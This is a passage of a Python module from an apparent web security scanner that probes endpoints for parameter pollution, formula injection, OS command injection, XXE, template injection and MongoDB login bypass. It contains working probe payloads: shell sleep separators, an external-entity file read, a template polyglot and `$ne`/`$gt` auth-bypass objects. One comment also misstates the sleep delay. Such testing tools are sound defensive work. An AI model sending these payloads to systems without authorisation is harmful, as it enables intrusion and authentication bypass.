"""Layer 9 — `stof/modules/injection_variants_tests.py`: HTTP Parameter
Pollution + CSV/Formula Injection (TC-134).

Grounded in OWASP WSTG-INPV-04 ("Testing for HTTP Parameter Pollution")
as the primary methodology, with PortSwigger's HPP research as
secondary support, and OWASP's CSV Injection guidance (CWE-1236) for
the second technique. Two genuinely different injection-variant shapes
bundled into one small module rather than two, matching this project's
"one module per coherent test-case family" convention (`configuration_
tests.py`'s TC-017 already bundles ten unrelated-but-small techniques
the same way).

**TC-134.1 HTTP Parameter Pollution** -- WSTG-INPV-04. This is a
DIFFERENTIAL check, not a naive "does duplicating a param do anything"
probe: two single-value baselines are taken first (value A alone, then
a second, distinct benign value B alone), establishing what a
"first-value-only" response and a "last-value-only" response actually
look like for this endpoint. Only THEN is the polluted request sent
(`param=A&param=B`, both benign, one already a real discovered
parameter). A finding requires the polluted response to either reflect
BOTH values (proof some layer processed the duplicate unexpectedly) or
differ from BOTH single-value baselines (the WSTG-INPV-04 "inconsistent
handling across the request-processing stack" signal -- e.g. a
WAF/validation layer reading only the first occurrence while the
application logic uses the last, or vice versa). The mere fact that a
duplicated param changes SOME response text is explicitly NOT enough on
its own -- matching either baseline is the expected, unremarkable
outcome and is never flagged. Findings are reported honestly as
"evidence of inconsistent parameter parsing worth manual review", never
as a confirmed exploit -- this technique cannot itself prove which
layer used which value or that anything is actually exploitable.

Gated behind `allow_state_changing_probes`: although the query-string
variant is read-only, the body-based POST variant resubmits a
discovered form with a duplicated field, which is write-adjacent the
same way any other real-POST probe in this codebase is (see
`sqli_tests.py`/`xss_tests.py`'s own plant-phase gating) -- this
project's conservative-by-default convention treats "sends a real POST
to a discovered endpoint" as gate-worthy regardless of payload danger.

**TC-134.2 CSV/Formula Injection** -- CWE-1236 / OWASP's CSV Injection
cheat sheet. Exact plant/verify shape `sqli_tests.py`'s TC-127.6 and
`xss_tests.py`'s TC-128.4 already established for this codebase: plant
a harmless, formula-shaped marker (`=1+1+"stofcsv<marker>"`, never an
actual malicious formula/macro/DDE payload) into a discovered free-text
POST field via a low-priv authenticated context, then check via a
SEPARATE, higher-privileged GET context whether the stored value
survives verbatim -- no leading `'`/quote-escape, no stripped `=`
prefix. STOF has no way to confirm a spreadsheet export actually
exists, so a hit is framed as "this value would survive into a CSV/
Excel export unescaped IF one exists", never as a confirmed CSV
injection. Reuses `_second_order_plant_candidates`/`_second_order_
verify_candidates` from `_injection_shared.py` unchanged -- same field-
name heuristics, same bounded plant x verify sweep.

Gated behind `allow_state_changing_probes`, same as TC-127.6/TC-128.4:
the plant phase is a real POST/write.

**TC-134.3 OS Command Injection** -- WSTG-INPV-12. Time-based blind,
same shape as `sqli_tests.py`'s TC-127.3: exactly one bounded sleep
delay, re-tried once to require a *repeatable* delta before ever
reporting (a single slow response is exactly as likely to be network
jitter as a real injected sleep). Unlike SQLi's single payload string,
command-injection shell metacharacters differ by which shell/context
the input reaches (`;`, `|`, backtick and `$()` command substitution
are all real, distinct disclosed patterns -- see knowledge base), so
this tries a short, bounded list of separator styles per candidate and
stops at the first repeatable hit, same "return on first confirmed
signal" convention as every other technique here.

**TC-134.4 XXE (XML External Entity)** -- WSTG-INPV-07. Re-sends a
discovered POST endpoint with `Content-Type: application/xml` and a
`<!DOCTYPE>` external entity pointing at a low-sensitivity file
(`/etc/hostname`, never `/etc/passwd` or anything credential-shaped --
this project's "signal only, never claim to have read real sensitive
data" convention, same restraint `sqli_tests.py`'s own docstring
states for SQLi). A FAIL requires the file's content-shaped signal
appearing in the response where the identical request WITHOUT the
external entity does not -- a differential check, not a bare substring
search. Falls back to a parser-error fingerprint (a real XML/entity
processing error surfaced in the response) as a lower-confidence
"likely" signal when the primary file-read differential doesn't fire --
some parsers reject external entities outright but still leak that
they attempted to resolve one.

**TC-134.5 SSTI (Server-Side Template Injection)** -- a marker-based
arithmetic-evaluation oracle, the same "compute an unlikely-to-occur-
naturally result and check it appears where the raw payload text does
not" shape `xss_tests.py`'s DOM-XSS dialog-marker check uses, applied
to template syntax instead of JS execution: two random small integers
are multiplied via a POLYGLOT payload trying several template engines'
expression syntax at once (`{{a*b}}` Jinja2/Twig, `${a*b}` Freemarker/
Thymeleaf/EL, `<%= a*b %>` ERB), and a FAIL requires the literal
PRODUCT to appear in the response while the raw, un-evaluated payload
text does not -- proof of evaluation, never a claim that arbitrary
code execution was achieved (this stays a candidate-detect signal,
matching this project's own RCE-adjacent restraint).

**TC-134.6 NoSQL Injection** -- MongoDB operator-injection auth
bypass, same login-bypass shape as `sqli_tests.py`'s TC-127.4 but for a
JSON-body login API instead of an HTML form: `find_login_endpoint`'s
sibling, a JSON-login-endpoint finder, locates a discovered POST/API
endpoint with username+password-shaped JSON fields, then substitutes
the password value with a MongoDB `$ne`/`$gt` operator object (real
disclosed pattern -- see knowledge base) instead of a string. Success
is confirmed the same way TC-127.4 confirms it: an actually-
authenticated-looking result (a redirect away from login, or a
JSON auth-token field appearing where the definitely-wrong-credentials
baseline has none), never a bare non-4xx status.
"""
from __future__ import annotations

import json
import secrets
from dataclasses import dataclass
from typing import TYPE_CHECKING
from urllib.parse import urlencode

from stof.core.logger import get_logger
from stof.findings.models import Finding

from ._injection_shared import (
    _second_order_plant_candidates,
    _second_order_verify_candidates,
    build_params,
    injectable_endpoints,
    looks_json_authenticated,
    placeholder_value,
    response_similarity,
    send_probe,
)
from .base import _PASSWORD_FIELD_HINTS, _USERNAME_FIELD_HINTS, VulnModule, find_login_endpoint
from .results import FAIL, PASS, SKIPPED, TestCaseResult, extract_findings

if TYPE_CHECKING:
    from stof.crawler.endpoint_store import Endpoint
    from stof.engine.multi_session import SessionPool
    from stof.evidence.collector import EvidenceCollector
    from stof.session.session_manager import SessionManager

_log = get_logger("modules.injection_variants_tests")

# A response similarity at/above this ratio to a baseline is treated as
# "same shape" -- matches `sqli_tests.py`'s own boolean-blind SQLi
# threshold philosophy (SequenceMatcher ratio, not exact-hash equality,
# since real pages carry per-request dynamic noise a hash comparison
# would over-flag on).
_SAME_SHAPE_SIMILARITY_THRESHOLD = 0.95


def _csv_formula_survives_unescaped(body: str, payload: str) -> bool:
    """Pure, directly-unit-testable oracle for TC-134.2's verify phase:
    the planted payload appears verbatim in `body` (proving the leading
    `=` was never stripped), AND the character immediately preceding
    it isn't a `'` -- the standard CSV-injection mitigation (Excel/
    Sheets/LibreOffice all treat a leading apostrophe as "force text",
    neutralizing the formula) that would otherwise make a byte-for-byte
    substring match a false positive."""
    idx = body.find(payload)
    if idx == -1:
        return False
    preceding = body[idx - 1] if idx > 0 else ""
    return preceding != "'"


def _hpp_pollution_signal(polluted_body: str, value_a: str, value_b: str, baseline_a_body: str, baseline_b_body: str) -> "str | None":
    """Pure, directly-unit-testable oracle for TC-134.1: returns a short
    reason string when the polluted response is genuinely inconsistent
    with both single-value expectations, `None` on a clean/expected
    result. Two honest triggers only (see module docstring for why):
    both values reflected together, or the polluted response resembling
    NEITHER single-value baseline."""
    if value_a in polluted_body and value_b in polluted_body:
        return "the response reflects BOTH the first and the duplicated value together"
    matches_first = response_similarity(polluted_body, baseline_a_body) >= _SAME_SHAPE_SIMILARITY_THRESHOLD
    matches_last = response_similarity(polluted_body, baseline_b_body) >= _SAME_SHAPE_SIMILARITY_THRESHOLD
    if not matches_first and not matches_last:
        return "the response matches neither a first-value-only nor a last-value-only expectation"
    return None


def _second_hpp_value(name: str) -> str:
    """A second benign placeholder for TC-134.1's duplicate-key probe,
    deliberately DISJOINT (as a literal substring) from `placeholder_
    value(name)`'s own return for every branch -- if `value_b` ever
    contained `value_a` as a substring (e.g. naively appending a
    suffix), the "reflects BOTH values" oracle below would trivially
    trigger on ANY response containing `value_b` alone, since it would
    always also "contain" `value_a`. Same branching shape as
    `placeholder_value` (`_injection_shared.py`) -- just a second,
    unrelated benign value per field-name category, never derived by
    concatenation."""
    lowered = name.lower()
    if "email" in lowered:
        return "stofdup@example.org"
    if "pass" in lowered:
        return "StofDup-9!"
    if any(h in lowered for h in ("id", "num", "amount", "qty", "quantity")):
        return "2"
    return "stofdup-alt-value"


async def _send_duplicated_param(context, endpoint: "Endpoint", other_params: dict, target_param: str, value_a: str, value_b: str, location: str) -> "tuple[int, str] | None":
    """Sends `target_param` TWICE (`value_a` then `value_b`) alongside
    every other of `endpoint.parameters` at its benign placeholder --
    the one shape `_injection_shared.send_probe`'s dict-based `params`
    genuinely cannot express (a `dict` can't hold a duplicate key), so
    this builds the query string / form body directly via `urlencode`
    over an explicit list of pairs instead. Mirrors `send_probe`'s own
    GET-vs-body routing and None-on-failure convention exactly, so
    callers can treat this as a drop-in duplicate-key variant of it."""
    pairs = [(name, other_params[name]) for name in other_params if name != target_param]
    pairs.append((target_param, value_a))
    pairs.append((target_param, value_b))
    query_string = urlencode(pairs)
    try:
        if endpoint.method.upper() == "GET" or location != "body":
            base = endpoint.url.split("?")[0]
            resp = await context.request.get(f"{base}?{query_string}", max_redirects=0)
        else:
            resp = await context.request.post(
                endpoint.url, data=query_string,
                headers={"Content-Type": "application/x-www-form-urlencoded"}, max_redirects=0,
            )
        body = await resp.text()
    except Exception as exc:
        _log.warning(f"HPP probe failed for {endpoint.url}: {exc}")
        return None
    return resp.status, body


# ---------------------------------------------------------------------------
# TC-134.3 -- OS Command Injection (time-based blind)
# ---------------------------------------------------------------------------

# Matches sqli_tests.py's own TC-127.3 bound exactly (2s delay, one
# confirmation retry) -- see that module's docstring for why a bounded,
# repeatable-before-reporting delay is the safe ceiling this project
# uses against a real, shared target this project doesn't own.
_CMD_INJECTION_DELAY_S = 6.0
_CMD_INJECTION_DELTA_THRESHOLD_S = 4.0

# A short, bounded set of shell-metacharacter separator styles -- real
# disclosed command-injection reports (see knowledge base) land on
# different ones depending on which shell/exec context the input
# reaches, so trying one alone would silently miss the others. Tried
# in order, per candidate, stopping at the first repeatable hit --
# never all four blindly summed (that would multiply the sleep delay,
# the exact DoS-risk restraint TC-127.3's own docstring already
# establishes for this codebase).
_CMD_INJECTION_SEPARATORS: tuple[str, ...] = ("; sleep {s} ;", "| sleep {s}", "$(sleep {s})", "`sleep {s}`")


def _cmd_injection_payloads(delay_s: float) -> tuple[str, ...]:
    return tuple(sep.format(s=int(delay_s)) for sep in _CMD_INJECTION_SEPARATORS)


# ---------------------------------------------------------------------------
# TC-134.4 -- XXE (XML External Entity)
# ---------------------------------------------------------------------------

# /etc/hostname, never /etc/passwd or anything credential-shaped -- a
# single short line, low-sensitivity, standard-on-every-Linux-target
# canary file, matching this project's "signal only, never claim to
# read real sensitive data" restraint (see module docstring).
_XXE_TARGET_FILE = "file:///etc/hostname"


def _xxe_payload(marker: str) -> str:
    return f'<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "{_XXE_TARGET_FILE}">]><root>{marker}-&xxe;-{marker}</root>'


def _xxe_baseline_payload(marker: str) -> str:
    """Structurally identical XML, no DOCTYPE/entity at all -- what
    TC-134.4's differential compares the payload response against, so
    "the endpoint just echoes whatever's between the root tags" alone
    can never masquerade as a real external-entity read."""
    return f"<?xml version=\"1.0\"?><root>{marker}-baseline-{marker}</root>"


# XML parser error signatures across common libraries -- same
# "checked as plain lowercase substrings, not a full parser" and
# "no bare generic words" convention `_SQL_ERROR_FINGERPRINTS`
# (`_injection_shared.py`) already established, applied to entity/DTD
# processing errors instead of SQL syntax errors.
_XXE_ERROR_FINGERPRINTS: tuple[str, ...] = (
    "doctype is not allowed", "external entity", "entity resolution", "undefined entity",
    "saxparseexception", "xmlsyntaxerror", "dtd is prohibited", "noentityresolver",
    "external general entities are not supported", "org.xml.sax", "libxml2",
)


def _looks_like_xxe_error(body: str) -> "str | None":
    lowered = body.lower()
    return next((sig for sig in _XXE_ERROR_FINGERPRINTS if sig in lowered), None)


def _xxe_file_read_signal(payload_body: str, baseline_body: str, marker: str) -> bool:
    """Pure oracle: the entity-substituted response must differ from
    the no-entity baseline AT the marker boundaries -- i.e. something
    other than an empty string (or the literal, un-resolved entity
    reference `&xxe;`) landed between this run's own markers. A parser
    that just drops unresolvable entities silently would otherwise
    make `payload_body == baseline_body`-shaped content look identical
    to a real read; requiring the substituted content to be BOTH
    present and non-trivial (not just whitespace) keeps this a real
    differential, not a bare substring search for the marker alone
    (which is present in both the payload and the baseline request)."""
    start_tag = f"{marker}-"
    end_tag = f"-{marker}"
    start_idx = payload_body.find(start_tag)
    if start_idx == -1:
        return False
    end_idx = payload_body.find(end_tag, start_idx + len(start_tag))
    if end_idx == -1:
        return False
    substituted = payload_body[start_idx + len(start_tag):end_idx]
    return bool(substituted.strip()) and substituted.strip() != "&xxe;"


async def _send_raw_body(context, url: str, body: str, content_type: str) -> "tuple[int, str] | None":
    """POSTs a raw string body with an explicit Content-Type --
    `_injection_shared.send_probe`'s dict-based `params` can express a
    form or a JSON object, never an arbitrary raw body (XML, in this
    case). Mirrors `send_probe`'s own None-on-failure convention."""
    try:
        resp = await context.request.post(url, data=body, headers={"Content-Type": content_type}, max_redirects=0)
        return resp.status, await resp.text()
    except Exception as exc:
        _log.warning(f"raw-body probe failed for {url}: {exc}")
        return None


# ---------------------------------------------------------------------------
# TC-134.5 -- SSTI (Server-Side Template Injection)
# ---------------------------------------------------------------------------


def _ssti_payload(a: int, b: int) -> str:
    """A polyglot trying several template engines' expression syntax
    at once -- real disclosed SSTI reports (see knowledge base) span
    Jinja2/Twig (`{{ }}`), Freemarker/Thymeleaf/EL (`${ }`), and ERB
    (`<%= %>`); a single-syntax payload would silently miss whichever
    engine the target actually runs. `a`/`b` are this run's own random
    small integers so the expected product can never coincidentally
    already appear in a page's normal content."""
    return f"{{{{{a}*{b}}}}}${{{a}*{b}}}<%= {a}*{b} %>"


def _ssti_evaluation_signal(body: str, a: int, b: int, raw_payload: str) -> bool:
    """Pure oracle: the computed product appears in `body`, AND the
    raw, un-evaluated payload text does not -- the same "proves
    evaluation, not mere reflection" shape `xss_tests.py`'s marker
    checks use throughout. A template engine that just echoes the
    literal `{{91*97}}` text back (never evaluating it) must never
    read as a hit."""
    product = str(a * b)
    return product in body and raw_payload not in body


# ---------------------------------------------------------------------------
# TC-134.6 -- NoSQL Injection (MongoDB operator auth bypass)
# ---------------------------------------------------------------------------

# Real disclosed pattern (see knowledge base): substituting a JSON
# login field's plain-string value with a MongoDB query operator
# object. `$ne: null` matches "anything not null" (works whenever the
# real field's stored value is non-null, i.e. essentially always);
# `$gt: ""` matches "anything greater than empty string" (true for
# every non-empty stored value) -- two independent operator shapes,
# tried in order, since a target may sanitize one but not the other.
_NOSQL_OPERATOR_PAYLOADS: tuple[dict, ...] = ({"$ne": None}, {"$gt": ""})


def _nosql_json_body(username_param: str, username_value: str, password_param: str, operator: dict) -> str:
    """Builds the raw JSON body directly (not through `build_params`,
    whose `dict[str, str]` shape can't hold a nested operator object
    as a value) -- `json.dumps` serializes `operator` (a real dict)
    correctly regardless of the surrounding value being plain strings."""
    return json.dumps({username_param: username_value, password_param: operator})


@dataclass
class InjectionVariantsTestConfig:
    low_priv_role: str = "normal"
    high_priv_role: str = "admin"
    allow_state_changing_probes: bool = False
    max_hpp_targets: int = 5
    max_second_order_plant_targets: int = 3
    max_second_order_verify_targets: int = 3
    max_cmd_injection_targets: int = 3
    max_xxe_targets: int = 3
    max_ssti_targets: int = 5


class InjectionVariantsTestsModule(VulnModule):
    module_id = "injection_variants_tests"
    name = "Injection Variants Tests (HPP, CSV Formula, Command Injection, XXE, SSTI, NoSQL Injection)"
    phase = 1

    def __init__(self, config: "InjectionVariantsTestConfig | None" = None) -> None:
        self.config = config or InjectionVariantsTestConfig()
        self._marker = secrets.token_hex(4)

    def _payload_for(self, technique_id: str) -> str:
        return {
            # A harmless, formula-shaped marker only -- never an actual
            # malicious formula/macro/DDE payload (WSTG/CWE-1236's own
            # PoC shape is `=1+1`; the appended quoted marker string is
            # this run's own unique tag, same convention every other
            # planted-marker technique in this codebase uses).
            "TC-134.2": f'=1+1+"stofcsv{self._marker}"',
        }[technique_id]

    async def run(self, endpoints, session_manager, session_pool, evidence=None) -> list[Finding]:
        return extract_findings(await self.run_techniques(endpoints, session_manager, session_pool, evidence))

    def _result(self, technique_id: str, technique: str, status: str, detail: str, vuln_type: str,
                role: "str | None" = None, endpoint=None, finding: "Finding | None" = None, severity: str = "Medium") -> TestCaseResult:
        return self._make_result(
            test_id="TC-134", technique_id=technique_id, technique=technique,
            vuln_type=vuln_type, status=status, detail=detail, severity=severity,
            role=role, endpoint=endpoint, finding=finding,
        )

    async def _technique_hpp(
        self,
        endpoints: "list[Endpoint]",
        session_manager: "SessionManager",
        session_pool: "SessionPool",
        evidence: "EvidenceCollector | None",
    ) -> TestCaseResult:
        tid, technique = "TC-134.1", "HTTP Parameter Pollution (duplicate parameter, differential baseline check)"
        vuln_type = "HTTP Parameter Pollution"
        if not self.config.allow_state_changing_probes:
            return self._result(tid, technique, SKIPPED, "allow_state_changing_probes is disabled -- the POST variant resubmits a discovered form", vuln_type)

        candidates = injectable_endpoints(endpoints, self.config.max_hpp_targets)
        if not candidates:
            return self._result(tid, technique, SKIPPED, "no discovered endpoint has a known parameter to duplicate", vuln_type)

        try:
            _session, context = await self._authenticated_context(session_manager, session_pool, self.config.low_priv_role, candidates[0].url)
        except KeyError as exc:
            return self._result(tid, technique, SKIPPED, f"role '{self.config.low_priv_role}' not configured: {exc}", vuln_type)

        checked = 0
        for endpoint in candidates:
            target_param = endpoint.parameters[0]
            location = endpoint.location_for(target_param)
            value_a = placeholder_value(target_param)
            value_b = _second_hpp_value(target_param)

            baseline_a = await send_probe(context, endpoint, build_params(endpoint, target_param, value_a), location)
            baseline_b = await send_probe(context, endpoint, build_params(endpoint, target_param, value_b), location)
            if baseline_a is None or baseline_b is None:
                continue
            polluted = await _send_duplicated_param(
                context, endpoint, build_params(endpoint, target_param, value_a), target_param, value_a, value_b, location,
            )
            if polluted is None:
                continue
            checked += 1

            _status_a, body_a, *_ = baseline_a
            _status_b, body_b, *_ = baseline_b
            _status_p, body_p = polluted
            reason = _hpp_pollution_signal(body_p, value_a, value_b, body_a, body_b)
            if reason is None:
                continue

            description = (
                f"{endpoint.method} {endpoint.url}: duplicating parameter '{target_param}' "
                f"('{target_param}={value_a}&{target_param}={value_b}') produced a response where {reason}, "
                "compared against separately-taken single-value baselines for each value. This is evidence of "
                "inconsistent parameter parsing across the request-processing stack (a WAF/validation layer "
                "reading a different occurrence than the application logic, per WSTG-INPV-04) worth manual "
                "review -- it does not by itself prove an exploitable filter bypass or access-control gap."
            )
            finding = Finding(
                module_id=self.module_id, vuln_type=vuln_type, severity="Medium", cvss_score=4.3,
                endpoint=endpoint, user_role=self.config.low_priv_role,
                request_raw=f"{endpoint.method} {endpoint.url}\n{target_param}={value_a}&{target_param}={value_b}",
                response_raw=body_p[:300],
                description=description,
                recommendation="Ensure every layer in the request path (WAF, load balancer, framework, application code) parses a duplicated parameter identically -- explicitly reject requests with duplicate parameter names where the framework allows it, rather than relying on whichever layer's implicit first/last behavior happens to match.",
                confidence="likely",  # evidence of inconsistent parsing, not by itself proof of an exploitable bypass -- see description
            )
            finding.evidence_refs = await evidence.capture_raw(finding.request_raw, finding.response_raw, label="hpp-inconsistent-parsing") if evidence else []
            return self._result(tid, technique, FAIL, description, vuln_type, role=self.config.low_priv_role, endpoint=endpoint, finding=finding, severity="Low")

        if checked == 0:
            return self._result(tid, technique, PASS, f"none of {len(candidates)} candidate endpoint(s) could be probed (all baseline/polluted requests failed)", vuln_type)
        return self._result(tid, technique, PASS, f"{checked} endpoint(s) checked with a duplicated parameter; every polluted response matched an expected single-value baseline", vuln_type, role=self.config.low_priv_role)

    async def _technique_csv_formula_injection(
        self,
        endpoints: "list[Endpoint]",
        session_manager: "SessionManager",
        session_pool: "SessionPool",
        evidence: "EvidenceCollector | None",
    ) -> TestCaseResult:
        tid, technique = "TC-134.2", "CSV/Formula Injection (planted marker, cross-endpoint/role verification)"
        vuln_type = "CSV/Formula Injection (Stored, Unverified Export)"
        if not self.config.allow_state_changing_probes:
            return self._result(tid, technique, SKIPPED, "allow_state_changing_probes is disabled -- the plant phase requires a real POST", vuln_type)

        plant_candidates = _second_order_plant_candidates(endpoints, self.config.max_second_order_plant_targets)
        verify_candidates = _second_order_verify_candidates(endpoints, self.config.max_second_order_verify_targets)
        if not plant_candidates:
            return self._result(tid, technique, SKIPPED, "no discovered POST form has a free-text-shaped field (comment/message/feedback/subject/notes/name/body) to plant a payload into", vuln_type)
        if not verify_candidates:
            return self._result(tid, technique, SKIPPED, "no discovered endpoint looks like a privileged display/admin page to verify against", vuln_type)

        payload = self._payload_for(tid)
        try:
            _plant_session, plant_context = await self._authenticated_context(session_manager, session_pool, self.config.low_priv_role, plant_candidates[0][0].url)
        except KeyError as exc:
            return self._result(tid, technique, SKIPPED, f"role '{self.config.low_priv_role}' not configured: {exc}", vuln_type)
        try:
            _verify_session, verify_context = await self._authenticated_context(session_manager, session_pool, self.config.high_priv_role, verify_candidates[0].url)
        except KeyError as exc:
            return self._result(tid, technique, SKIPPED, f"role '{self.config.high_priv_role}' not configured: {exc}", vuln_type)

        for plant_endpoint, plant_field in plant_candidates:
            params = build_params(plant_endpoint, plant_field, payload)
            location = plant_endpoint.location_for(plant_field)
            plant_probe = await send_probe(plant_context, plant_endpoint, params, location)
            if plant_probe is None:
                continue
            for verify_endpoint in verify_candidates:
                verify_probe = await self._probe_get(verify_context, verify_endpoint.url)
                if verify_probe is None:
                    continue
                verify_status, verify_body = verify_probe
                if not _csv_formula_survives_unescaped(verify_body, payload):
                    continue
                description = (
                    f"Planted a harmless, formula-shaped marker payload ('{payload}') into field "
                    f"'{plant_field}' via {plant_endpoint.method} {plant_endpoint.url} (as role "
                    f"'{self.config.low_priv_role}'); a SEPARATE, later GET request to {verify_endpoint.url} "
                    f"(as role '{self.config.high_priv_role}') returned that same value verbatim (HTTP "
                    f"{verify_status}), with no leading-quote/`=`-stripping sanitization applied. STOF cannot "
                    "confirm a CSV/Excel export of this data actually exists -- this only proves the raw value "
                    "would survive into one unescaped IF one exists, which is the precondition CSV/Formula "
                    "injection (CWE-1236) needs, not a confirmed CSV injection."
                )
                finding = Finding(
                    module_id=self.module_id, vuln_type=vuln_type, severity="Medium", cvss_score=5.3,
                    endpoint=verify_endpoint, user_role=self.config.high_priv_role,
                    request_raw=(
                        f"PLANT: {plant_endpoint.method} {plant_endpoint.url}\n{plant_field}={payload!r}\n"
                        f"VERIFY: GET {verify_endpoint.url}"
                    ),
                    response_raw=verify_body[:300],
                    description=description,
                    recommendation="Prefix any cell value beginning with =, +, -, or @ with a leading apostrophe (or strip/neutralize the leading character) before it can reach a CSV/Excel export, on every endpoint that displays or exports stored user-supplied content.",
                    confidence="likely",  # proves the precondition (unescaped survival), not a confirmed CSV export -- see description
                )
                finding.evidence_refs = await evidence.capture_raw(finding.request_raw, finding.response_raw, label="csv-formula-injection") if evidence else []
                return self._result(tid, technique, FAIL, description, vuln_type, role=self.config.high_priv_role, endpoint=verify_endpoint, finding=finding, severity="Medium")
        return self._result(
            tid, technique, PASS,
            f"{len(plant_candidates)} free-text field(s) planted, {len(verify_candidates)} privileged "
            "endpoint(s) checked afterward, no unescaped formula-shaped value observed",
            vuln_type, role=self.config.high_priv_role,
        )

    async def _cmd_injection_candidate(self, endpoint: "Endpoint", param: str, location: str, context, payload: str) -> "float | None":
        """One (endpoint, param, payload)'s baseline-then-payload timing
        delta, or `None` if either probe failed. Same shape as
        `sqli_tests.py`'s `_time_based_candidate`, extracted the same
        way so `_technique_command_injection` stays orchestration only."""
        baseline = await send_probe(context, endpoint, build_params(endpoint, param, placeholder_value(param)), location)
        if baseline is None:
            return None
        probe = await send_probe(context, endpoint, build_params(endpoint, param, payload), location)
        if probe is None:
            return None
        return probe[2] - baseline[2]

    async def _technique_command_injection(
        self, endpoints: "list[Endpoint]", session_manager: "SessionManager", session_pool: "SessionPool", evidence: "EvidenceCollector | None",
    ) -> TestCaseResult:
        tid, technique = "TC-134.3", f"OS Command Injection (time-based blind, one {_CMD_INJECTION_DELAY_S:.0f}s-capped payload per separator style)"
        vuln_type = "OS Command Injection (time-based blind)"
        candidates = injectable_endpoints(endpoints, self.config.max_cmd_injection_targets)
        if not candidates:
            return self._result(tid, technique, SKIPPED, "no query/body parameter discovered to probe", vuln_type)
        try:
            _session, context = await self._authenticated_context(session_manager, session_pool, self.config.low_priv_role, candidates[0].url)
        except KeyError as exc:
            return self._result(tid, technique, SKIPPED, f"role '{self.config.low_priv_role}' not configured: {exc}", vuln_type)

        payloads = _cmd_injection_payloads(_CMD_INJECTION_DELAY_S)
        for endpoint in candidates:
            if not endpoint.parameters:
                continue
            param = endpoint.parameters[0]
            location = endpoint.location_for(param)
            for payload in payloads:
                delta = await self._cmd_injection_candidate(endpoint, param, location, context, payload)
                if delta is None or delta < _CMD_INJECTION_DELTA_THRESHOLD_S:
                    continue
                # Require the delay to repeat once before reporting --
                # same "not one-off network jitter" discipline
                # sqli_tests.py's TC-127.3 already established.
                confirm_delta = await self._cmd_injection_candidate(endpoint, param, location, context, payload)
                if confirm_delta is None or confirm_delta < _CMD_INJECTION_DELTA_THRESHOLD_S:
                    continue
                description = (
                    f"Injecting a bounded {_CMD_INJECTION_DELAY_S:.0f}s shell sleep payload ('{payload}') into "
                    f"parameter '{param}' ({location}) on {endpoint.method} {endpoint.url} added a repeatable "
                    f"~{min(delta, confirm_delta):.2f}s of response latency compared to a baseline request -- a "
                    "timing signal consistent with the injected value reaching an OS shell/exec call. This is a "
                    "candidate signal only: no command output was read, and the sleep payload used is capped and "
                    "was never repeated beyond this one confirmation."
                )
                finding = Finding(
                    module_id=self.module_id, vuln_type=vuln_type, severity="Critical", cvss_score=9.1,
                    endpoint=endpoint, user_role=self.config.low_priv_role,
                    request_raw=f"{endpoint.method} {endpoint.url}\n{param}={payload!r}",
                    response_raw=f"observed delta: first={delta:.2f}s, confirm={confirm_delta:.2f}s",
                    description=description,
                    recommendation="Never pass user-supplied input to a shell/exec call. Use a language-level API (no shell interpretation) with an argument array, and if a shell is unavoidable, strictly allowlist expected input shapes before it ever reaches the call.",
                    confidence="likely",  # timing signal only -- no command output observed, see description
                )
                finding.evidence_refs = await evidence.capture_raw(finding.request_raw, finding.response_raw, label=f"cmdi-time-{param}") if evidence else []
                return self._result(tid, technique, FAIL, description, vuln_type, role=self.config.low_priv_role, endpoint=endpoint, finding=finding, severity="Critical")
        return self._result(
            tid, technique, PASS,
            f"{len(candidates)} endpoint(s) probed with {len(payloads)} separator style(s) each, no repeatable timing delta observed",
            vuln_type, role=self.config.low_priv_role,
        )

    async def _technique_xxe(
        self, endpoints: "list[Endpoint]", session_manager: "SessionManager", session_pool: "SessionPool", evidence: "EvidenceCollector | None",
    ) -> TestCaseResult:
        tid, technique = "TC-134.4", "XXE (XML External Entity) via re-submitted POST endpoint, differential file-read + parser-error fallback"
        vuln_type = "XXE (XML External Entity Injection)"
        candidates = [e for e in endpoints if e.method.upper() == "POST"][: self.config.max_xxe_targets]
        if not candidates:
            return self._result(tid, technique, SKIPPED, "no discovered POST endpoint to re-submit with an XML body", vuln_type)
        try:
            _session, context = await self._authenticated_context(session_manager, session_pool, self.config.low_priv_role, candidates[0].url)
        except KeyError as exc:
            return self._result(tid, technique, SKIPPED, f"role '{self.config.low_priv_role}' not configured: {exc}", vuln_type)

        marker = f"stofxxe{self._marker}"
        payload = _xxe_payload(marker)
        baseline_payload = _xxe_baseline_payload(marker)
        checked = 0
        for endpoint in candidates:
            baseline = await _send_raw_body(context, endpoint.url, baseline_payload, "application/xml")
            payload_probe = await _send_raw_body(context, endpoint.url, payload, "application/xml")
            if baseline is None or payload_probe is None:
                continue
            checked += 1
            _baseline_status, baseline_body = baseline
            payload_status, payload_body = payload_probe

            if _xxe_file_read_signal(payload_body, baseline_body, marker):
                description = (
                    f"Re-submitting {endpoint.method} {endpoint.url} with `Content-Type: application/xml` and a "
                    f"DOCTYPE declaring an external entity pointing at '{_XXE_TARGET_FILE}' (HTTP {payload_status}) "
                    "returned content substituted at the entity reference that a structurally identical request "
                    "WITHOUT the entity does not -- consistent with the XML parser resolving an external entity "
                    "and reading local file content. Only a low-sensitivity canary file was targeted; no "
                    "credential-shaped or otherwise sensitive file content was read or is claimed here."
                )
                finding = Finding(
                    module_id=self.module_id, vuln_type=vuln_type, severity="Critical", cvss_score=9.1,
                    endpoint=endpoint, user_role=self.config.low_priv_role,
                    request_raw=f"POST {endpoint.url}\nContent-Type: application/xml\n{payload}",
                    response_raw=payload_body[:300],
                    description=description,
                    recommendation="Disable DTD processing and external entity resolution in the XML parser (e.g. `FEATURE_SECURE_PROCESSING`, disallow-doctype-decl) -- the standard, well-documented mitigation for every major XML library.",
                )
                finding.evidence_refs = await evidence.capture_raw(finding.request_raw, finding.response_raw, label="xxe-file-read") if evidence else []
                return self._result(tid, technique, FAIL, description, vuln_type, role=self.config.low_priv_role, endpoint=endpoint, finding=finding, severity="Critical")

            error_sig = _looks_like_xxe_error(payload_body)
            if error_sig and not _looks_like_xxe_error(baseline_body):
                description = (
                    f"Re-submitting {endpoint.method} {endpoint.url} with an external-entity-declaring XML body "
                    f"(HTTP {payload_status}) surfaced an XML/entity-processing error ('{error_sig}') that the "
                    "identical request without the entity does not -- the parser attempted to process the "
                    "external entity before rejecting it. Lower-confidence than a confirmed file read: this "
                    "shows the parser is entity-processing-aware, worth manual review, not confirmed exploitable."
                )
                finding = Finding(
                    module_id=self.module_id, vuln_type=vuln_type, severity="Medium", cvss_score=5.3,
                    endpoint=endpoint, user_role=self.config.low_priv_role,
                    request_raw=f"POST {endpoint.url}\nContent-Type: application/xml\n{payload}",
                    response_raw=payload_body[:300],
                    description=description,
